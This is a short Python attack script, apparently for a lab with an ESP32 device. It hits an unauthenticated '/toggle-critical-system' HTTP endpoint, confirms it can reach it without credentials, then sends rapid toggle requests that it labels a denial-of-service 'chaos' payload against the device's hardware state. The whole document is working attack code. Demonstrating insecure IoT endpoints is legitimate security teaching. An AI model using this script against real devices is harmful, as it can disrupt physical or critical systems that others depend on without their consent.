import requests
import time

# Replace with the IP address printed in the ESP32 Serial Monitor
TARGET_IP = "target-iot-device-ip"
TARGET_PORT = 80
ENDPOINT = "/toggle-critical-system"

url = f"http://{TARGET_IP}:{TARGET_PORT}{ENDPOINT}"

print(f"[*] Targeting Insecure IoT Device at {TARGET_IP}...")

try:
    # 1. Recon: Check if the device is alive
    response = requests.get(url)
    
    if response.status_code == 200:
        print(f"[+] VULNERABILITY CONFIRMED: Accessed {ENDPOINT} without credentials.")
        print(f"[+] Device Response: {response.text}")
        
        # 2. Payload: Toggle the system rapidly (Denial of Service / Chaos)
        print("[*] Initiating rapid toggle attack...")
        for i in range(5):
            requests.get(url)
            print(f"   -> Command {i+1} sent: TOGGLE")
            time.sleep(0.5)
            
        print("[+] Attack Complete. Hardware state manipulated.")
    else:
        print("[-] Failed to access endpoint. Device might be secured.")

except requests.exceptions.ConnectionError:
    print("[-] Could not connect. Check IP address.")